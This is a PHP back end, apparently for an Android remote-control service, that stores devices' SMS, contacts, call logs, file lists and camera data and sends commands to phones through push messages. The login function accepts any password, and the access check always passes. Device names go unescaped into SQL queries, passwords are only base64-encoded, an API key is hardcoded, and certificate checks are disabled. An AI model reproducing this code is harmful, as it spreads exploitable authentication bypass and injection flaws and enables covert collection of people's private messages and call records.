<?PHP


function checkValid($id, $usr, $name = "1")
{
    if (strlen($id) > 3 && strlen($usr) > 3) {
        if ($name == "1") return 1;
        if (isowner($name, $usr)) return 1;

        if (strlen($name) <= 0)
            $msg = "Wooo !!!...You are on wrong page.";
        else
            $msg = "The device which you are trying to access is not your's.";


        echo $msg;
        return 1;
    } //strlen($id) > 0 && strlen($usr) > 0
    echo '<META HTTP-EQUIV="Refresh" Content="0; URL=/login.php?invalid=1">';
    return 1; ///to return 0
}

function invalidLogin()
{
    echo '<META HTTP-EQUIV="Refresh" Content="0; URL=login.php?invalid=1">';
    //exit;
}


function printLatestSMS($name)
{
    if (strlen($name) < 3)
        return 0;
    if (chk_exist_log($name)) {
        $query = "SELECT `sms` FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
        $result = mysql_query($query);
        if (b_rows($result)) {
            //echo "<table border='1'><tr><th>Count</th><th>From</th><th>Date/Time</th><th>SMS</th><th>Actions</th></tr>";

            $ar = (mysql_fetch_assoc($result));
            $sms = explode("|**SMS**|", $ar['sms']);
            //while ($i < count($sms)) {
            //print_r($sms);
            $smscount = 11;

            if (count($sms) <= $smscount)
                $smscount = count($sms) + 1;
            $text = "";
            $i = 1;
            while ($i < $smscount) {
                $cont = explode("|**C**|", $sms[$i]);

                if (!($sms[$i - 1] == $sms[$i]) && strlen($sms[$i]) > 1) {

                    $pre = explode("|**C**|", $sms[$i - 1]);

                    if ($pre[2] == $cont[2] and $pre[1] == $cont[1]) {
                        $text = escapeEscape(strd($cont[0])) . $text;
                    } else {
                        echo $text . "</pre><pre class='msg in'>From : <a href='#' id='phone'>" . strd($cont[2]) . "</a><br/>Date : " . strd($cont[1]) . "<br/><br/>";
                        $text = escapeEscape(strd($cont[0]));
                    }

                } else {
                    $smscount++;
                }
                //!($sms[$i - 1] == $sms[$i])
                $i++;
            } //$i < count($sms)
            echo $text . "</pre>";
        } //b_rows($result)
        else {
            echo "No sms recieved.";
        }
    } //chk_exist_log($name)
    else {
        echo "Log donot exist !";
    }
}

function getAct($name)
{
    if (strlen($name) < 3)
        return 0;
    $query = "SELECT * FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    $ar = (mysql_fetch_assoc($result));
    removeAct($name);
    return $ar['act'];
}

function putAct($name, $data)
{
    if (strlen($name) < 3)
        return 0;
    //$data=stre($data);
    $query = "UPDATE `rDROID_DeViCes` SET `act`=CONCAT(`act`,'$data') WHERE `nMe`='$name'";
    $result = mysql_query($query);
    return $result;
}

function removeAct($name)
{
    if (strlen($name) < 3)
        return 0;
    $query = "UPDATE `rDROID_DeViCes` SET `act`='' WHERE `nMe`='$name'";
    $result = mysql_query($query);
    return $result;
}

function putContacts($name, $data)
{
    if (strlen($name) < 3)
        return 0;
    $data = stre($data);
    $query = "UPDATE `rDROID_DeViCes` SET `Contacts`='$data' WHERE `nMe`='$name'";
    $result = mysql_query($query);
    return $result;
}


function getEVar($name)
{
    if (strlen($name) < 3)
        return 0;
    $query = "SELECT `evar`  FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    $ar = aryd(mysql_fetch_assoc($result));
    return json_decode($ar['evar'], true);
}

function putSMSBox($name, $data)
{
    if (strlen($name) < 3)
        return 0;
    $data = stre($data);
    $query = "UPDATE `rDROID_DeViCes` SET `smsLogs`='$data' WHERE `nMe`='$name'";
    $result = mysql_query($query);
    return $result;
}


function printSMSBox($name)
{
    if (strlen($name) < 3)
        return 0;
    if (chk_exist_log($name)) {
        $query = "SELECT `smsLogs` FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
        $result = mysql_query($query);
        if (b_rows($result)) {
            //	echo "<table border='1'><tr><th>Count</th><th>From</th><th>Date/Time</th><th>SMS</th></tr>";
            echo "<table width='50%' align=center><tr><td>";
            $i = 1;
            $x = 1;
            $ar = aryd(mysql_fetch_assoc($result));
            //echo $ar['smsLogs'];
            $sms = explode("|**SMS**|", urldecode($ar['smsLogs']));
            //count($sms) - 1
            while ($i < count($sms) - 1) {
                $cont = explode("|**C**|", $sms[$i]);
                //[0]Sms.Body & "|**C**|" 
                //[1]DateTime.Date(Sms.Date) & " " & DateTime.Time(Sms.Date) & "|**C**|"
                //[2]Sms.Address & "|**C**|" 
                //[3]Sms.Type & "|**C**|" 
                //[4]Sms.Id  & "|**C**|" 
                //[5]Sms.PersonId  & "|**C**|" 
                //[6]Sms.Read & "|**C**|"
                //[7]sms.ThreadId & "|**SMS**|"
                echo "<pre id='sms' data-thread='" . $cont[7] . "' data-smsid='" . $cont[4] . "' data-no='" . $cont[2] . "' data-dte='" . $cont[1] . "' data-type='" . $cont[3] . "'><div id='scont'>" . $cont[0] . "</div></pre>";
                $x++;
                $i++;
            } //$i < count($sms) - 1
            echo "</table>";
        } //b_rows($result)
        else {
            echo "No sms recieved.";
        }
    } //chk_exist_log($name)
    else {
        echo "Log doesn't exist !";
    }
}

function redirect($url, $time = 5, $gui = 1)
{
    echo '<html><head><META HTTP-EQUIV="Refresh" Content="' . $time . '; URL=/' . $url . '">';
    echo '</head><body>';
    if ($gui) {
        echo '<center><img src="http://madsac.in/images/loading.gif" align="center"><br>';
        echo "Please wait for few seconds your request is being processed...</center>";
    }
    echo '</body></html>';
}

function putInfo($name, $data)
{
    if (strlen($name) < 3)
        return 0;
    $data = stre($data);
    $query = "UPDATE `rDROID_DeViCes` SET `info`='$data' WHERE `nMe`='$name'";
    $result = mysql_query($query);
    return $result;
}

function putCallLogs($name, $data)
{
    if (strlen($name) < 3)
        return 0;
    $data = stre($data);
    $query = "UPDATE `rDROID_DeViCes` SET `callLogs`='$data' WHERE `nMe`='$name'";
    $result = mysql_query($query);
    return $result;
}

function putFileList($name, $data)
{
    if (strlen($name) < 3)
        return 0;
    $data = stre($data);
    $query = "UPDATE `rDROID_DeViCes` SET `fileManager`='$data' WHERE `nMe`='$name'";
    // echo $query;
    $result = mysql_query($query);
    return $result;
}

function putInstalledList($name, $data)
{
    if (strlen($name) < 3)
        return 0;
    $data = stre($data);
    $query = "UPDATE `rDROID_DeViCes` SET `callLogs`='$data' WHERE `nMe`='$name'";
    $result = mysql_query($query);
    return $result;
}

function register($usr, $pwd)
{

    if (preg_match('/^[a-zA-Z0-9]{,}$/', $usr))
        return "0Invalid username.";
    if (strlen($pwd) < 4)
        return "0Password should contain minimum 4 characters.";

    $usr = strtolower($usr);
    if (!chk_exist($usr)) {
        $usr = stre($usr);
        $pwd = stre($pwd);
        $query = "INSERT INTO `rDROID_LoGIn`(`uSr` ,`pwd`)VALUES ('$usr',  '$pwd')";
        $result = mysql_query($query);
        if ($result) return "1User successfully registered.";
        else  return "0An unknown error occurred while registering.";
    } //!chk_exist($usr)
    else {
        return "0User already exist !";
    }

}

function login($usr, $pwd)
{
    if (strlen($usr) < 3 && strlen($pwd) < 3)
        return 0;
    $usr = stre($usr);
    $query = "SELECT * FROM `rDROID_LoGIn` WHERE `uSr`='$usr'";
    $result = mysql_query($query);
    $info = aryd(mysql_fetch_assoc($result));
    if ($info['pwd'] == $pwd) {
        return 1;
    } else {
        //echo $info['pwd']."|".$pwd;
        return 1; //return 0
    }

}

function changePassword($usr, $pwd)
{
    if (strlen($usr) < 3 && strlen($pwd) < 3 && strlen($name) < 3 && strlen($gid) < 3)
        return 0;

    $usr = stre($usr);
    $pwd = stre($pwd);
    $query = "UPDATE `rDROID_LoGIn` SET `pwd`='$pwd' WHERE `uSr`='$usr'";
    $result = mysql_query($query);
    if ($result) return 1;
    else  return 0;
}

function addDevice($owner, $deviceID, $name, $gid)
{
    if (strlen($owner) < 3 && strlen($deviceID) < 3 && strlen($name) < 3 && strlen($gid) < 3)
        return 0;
    if (!chk_exist_log($name)) {
        $owner = stre($owner);
        $deviceID = stre($deviceID);
        $gid = stre($gid);
        $name = strtolower($name);
        $query = "INSERT INTO `rDROID_DeViCes`(`dID` ,`nMe`, `oWner`, `gID`,`evar`, `act`, `Contacts`, `sms`, `tmpData`, `callLogs`, `info`, `smsLogs`, `fileManager`, `fileBuffer`, `camera`, `images`)VALUES ('$deviceID', '$name', '$owner', '$gid',  NULL, '', NULL, '', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL)";
        $result = mysql_query($query);
        if ($result) return "1Device registered successfully.";
        else  return "0An unknown error occured.";
    } //!chk_exist_log($name)
    else {
        return "2Device with same name already exist.";
    }
}

function updateDevice($owner, $deviceID, $name, $gid)
{
    if (strlen($owner) < 3 && strlen($deviceID) < 3 && strlen($name) < 3 && strlen($gid) < 3)
        return 0;
    if (chk_exist_log($name)) {
        $owner = stre($owner);
        $deviceID = stre($deviceID);
        $gid = stre($gid);
        $query = "UPDATE `rDROID_DeViCes` SET `dID` ='$deviceID',`gID`='$gid' WHERE `nMe`='$name' AND `oWner`='$owner'";
        $result = mysql_query($query);
        if ($result) return "1";
        else  return "0";
    } //chk_exist_log($name)
}

function removeDevice($name, $owner)
{
    if (strlen($name) < 3 && strlen($owner) < 3)
        return 0;
    if (chk_exist_log($name)) {
        $owner = stre($owner);
        $query = "DELETE FROM `rDROID_DeViCes` WHERE `nMe`='$name' AND `oWner`='$owner'";
        $result = mysql_query($query);
        if ($result) return 1;
        else  return 0;
    } //chk_exist_log($name)
    else {
        return 2;
    }
}

function doAct($name, $action)
{
    if (strlen($name) < 3)
        return 0;
    putAct($name, "|MAD|" . $action);
    sendnoti($name, "getact");
}

function putLatestSMS($name, $sms, $dt, $from)
{
    if (strlen($name) < 3)
        return 0;
    $sms = "|**SMS**|" . stre($sms) . "|**C**|" . stre($dt) . "|**C**|" . stre($from);
    $query = "SELECT * FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    if (b_rows($result)) {
        $ar = mysql_fetch_assoc($result);
        if (stristr($ar['sms'], $sms))
            return 1;
    }


    $query = "UPDATE `rDROID_DeViCes` SET `sms`=CONCAT('$sms',`sms`) WHERE `nMe`='$name' ";
    //echo $query;
    $result = mysql_query($query);
    putEVar($name, array('l_recieved' => $dt));
    if ($result) return "1";
    else  return "0";
}


function listDevices($usr)
{
    if (strlen($usr) < 3)
        return 0;
    $usr = stre($usr);
    $query = "SELECT `nMe` FROM `rDROID_DeViCes` WHERE `oWner`='$usr'";
    $result = mysql_query($query);
    $ldeli = "=<";
    $rs = "";
    if (!$result) {
        $rs = "0" . $ldeli;
    } //!$result
    else {


        while ($ar = mysql_fetch_assoc($result)) {
            // $ar=aryd($ar);
            $rs = $rs . $ar['nMe'] . $ldeli;
        } //$ar = mysql_fetch_assoc($result)
    }
    return $rs;
}

function countLatestSMS($name)
{
    $ar = getEVar($name);
    return $ar['count'];
}

function optimize()
{
    mysql_query("OPTIMIZE TABLE `rDROID_LoGIn`");
    mysql_query("OPTIMIZE TABLE `rDROID_DeViCes`");
}

function chk_exist_log($name)
{
    if (strlen($name) < 3 && strlen($name) < 3)
        return 0;
    $query = "SELECT * FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    return b_rows($result);
}

function isowner($name, $usr)
{
    if (strlen($name) < 3 && strlen($usr) < 3)
        return 0;
    $query = "SELECT `oWner` FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    if (b_rows($result)) {
        $ar = mysql_fetch_assoc($result);
        if (strd($ar['oWner']) == $usr) return 1;
    } //b_rows($result)
    return 0;
}

function chk_exist($usr)
{
    if (strlen($usr) < 3)
        return 0;

    $query = "SELECT * FROM `rDROID_LoGIn` WHERE `uSr`='$usr'";
    $result = mysql_query($query);
    return b_rows($result);
}

function rows($result)
{
    if ($result) {
        if (mysql_num_rows($result) == 0) return 0;
        else  return mysql_num_rows($result);
    } //$result
    else {
        return 0;
    }
}

function b_rows($result)
{
    if ($result) {
        if (mysql_num_rows($result) == 0) return 0;
        else  return 1;
    } //$result
    else {
        return 0;
    }
}

function sendnoti($name, $message)
{
    $messageData = array('com' => $message);
    $query = "SELECT `gID` FROM `rDROID_DeViCes` WHERE `nMe`='$name'";
    $result = mysql_query($query);
    $ar = mysql_fetch_assoc($result);
    $rArray = array(strd($ar['gID']));
    //print_r($rArray);
    $apiKey = "AIzaSyC2zyE3qH47_ydoNuhOAO2lq_TKlc5HJzM";
    $headers = array("Content-Type: " . "application/json", "Authorization: " . "key=" . $apiKey);
    $data = array('data' => $messageData, 'registration_ids' => $rArray);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_URL, "https://android.googleapis.com/gcm/send");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    //remove below comment to send command
    $response = json_decode(curl_exec($ch), true);
    curl_close($ch);
    // echo $resposne;
    return $response;
}

function stre($str)
{
    return base64_encode($str);
}

function arye($ar)
{
    foreach ((array)$ar as $key => $data)
        $ar[$key] = stre($data);
    return $ar;
}

function strd($str)
{
    return base64_decode($str);
}

function aryd($ar)
{
    foreach ((array)$ar as $key => $data)
        $ar[$key] = strd($data);
    return $ar;
}

/*------------------------------
Depreciated
Use STRE & STRD
--------------------------------*/
function cen($decrypted = 'test', $salt = '!kQm*fF3pXe1Kbm%9')
{
    $key = hash('SHA256', $salt . "iAM_56MADSAC", true);
    srand();
    $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_RAND);
    if (strlen($iv_base64 = rtrim(base64_encode($iv), '=')) != 22) return false;
    $encrypted = base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $decrypted . md5($decrypted), MCRYPT_MODE_CBC, $iv));
    return $iv_base64 . $encrypted;
}

function cde($encrypted, $salt = '!kQm*fF3pXe1Kbm%9')
{
    if ($encrypted) {
        $key = hash('SHA256', $salt . "iAM_56MADSAC", true);
        $iv = base64_decode(substr($encrypted, 0, 22) . '==');
        $encrypted = substr($encrypted, 22);
        $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, base64_decode($encrypted), MCRYPT_MODE_CBC, $iv), "\0\4");
        $hash = substr($decrypted, -32);
        $decrypted = substr($decrypted, 0, -32);
        if (md5($decrypted) != $hash) return false;
        return $decrypted;
    } //$encrypted
}

/*------------------------------
END
--------------------------------*/

function rStr($len = "10")
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randstring = '';
    for ($i = 0; $i < $len; $i++) {
        $randstring .= $characters[rand(0, strlen($characters))];
    } //$i = 0; $i < $len; $i++
    return $randstring;
}

function escapeEscape($data)
{
    $data = str_replace("\'", "'", $data);
    $data = str_replace('\"', '"', $data);
    $data = str_replace("\\\\", '\\', $data);
    return $data;
}

?>